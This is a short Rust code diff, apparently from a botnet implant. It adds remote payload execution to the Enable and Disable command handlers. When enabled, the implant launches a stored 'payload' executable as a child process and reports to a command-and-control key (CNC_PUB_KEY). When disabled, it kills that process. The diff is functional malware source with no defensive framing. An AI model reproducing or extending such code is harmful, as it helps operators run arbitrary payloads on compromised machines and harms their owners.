@@ -71,6 +71,10 @@ pub struct DisableCommand {}
 impl Command for DisableCommand {
     async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
         state.enabled = false;
+        if let Some(ref mut child) = state.child {
+            child.kill()?;
+            state.child = None;
+        }
         session.update_metadata(state.to_string().as_str()).await?;
         session
             .send_msg("I'm disabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
@@ -84,10 +88,18 @@ pub struct EnabledCommand {}
 impl Command for EnabledCommand {
     async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
         state.enabled = true;
+        if let Some(child) = &mut state.child {
+            child.kill()?;
+            state.child = None;
+        }
+        if let Some(ref path_buf) = state.payload {
+            state.child = Some(session.run_executable(path_buf));
+        }
         session.update_metadata(state.to_string().as_str()).await?;
         session
             .send_msg("I'm enabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
             .await?;
+
         Ok(())
     }
 }
